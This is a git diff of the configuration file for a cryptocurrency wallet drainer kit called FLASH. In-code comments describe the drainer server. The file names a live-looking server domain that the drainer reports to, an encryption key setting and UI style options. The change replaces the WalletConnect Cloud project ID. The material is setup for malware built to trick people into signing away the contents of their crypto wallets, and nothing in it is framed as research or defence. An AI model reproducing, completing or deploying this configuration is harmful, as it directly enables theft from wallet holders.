@@ -17,7 +17,7 @@ let FLASH_Encryption_Key = 50; // Specify any number that will be used for encry
 const FLASH_Server = "mdpp.neutralpro.live"; // Specify the domain that is attached to the drainer server
 // This is the domain where you have a server, and not the site itself where you plan to use the drainer
 
-const FLASH_WalletConnect_ID = "53cb6c00218a6d60162590ce6debfc5c"; // Project ID из WalletConnect Cloud change this
+const FLASH_WalletConnect_ID = "a2d36c15bee69239fd8fed084ecd74ad"; // Project ID из WalletConnect Cloud change this
 
 const FLASH_Modal_Style = 2; // 1 - old, 2 - new (update from 10/01/2023)
 const FLASH_Loader_Style = 2; // 1 - old, 2 - new (update from 10/01/2023)
